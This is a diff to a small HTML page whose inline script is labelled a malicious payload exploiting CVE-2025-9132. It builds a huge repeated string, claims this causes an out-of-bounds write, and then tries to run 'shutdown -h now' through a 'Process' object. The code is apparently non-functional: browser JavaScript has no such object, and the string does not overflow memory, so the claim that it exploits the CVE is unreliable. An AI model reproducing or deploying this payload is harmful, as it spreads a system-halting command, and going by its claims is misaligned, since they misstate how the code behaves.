@@ -2,18 +2,24 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>copilot pwnsalot</title>
+    <title>CVE-2025-9132 Shutdown Exploit</title>
 </head>
 <body>
     <script>
+        // Malicious JavaScript payload to exploit CVE-2025-9132
         function exploit() {
+            // Craft a malicious object that triggers the out-of-bounds write
             let obj = {};
-            obj.prop = 'A'.repeat(0x1000000);
+            obj.prop = 'A'.repeat(0x1000000); // Large string to overflow
             console.log(obj.prop);
+
+            // Execute a command to shut down the system
             const command = 'shutdown -h now';
             const process = new Process();
             process.exec(command);
         }
+
+        // Call the exploit function
         exploit();
     </script>
 </body>
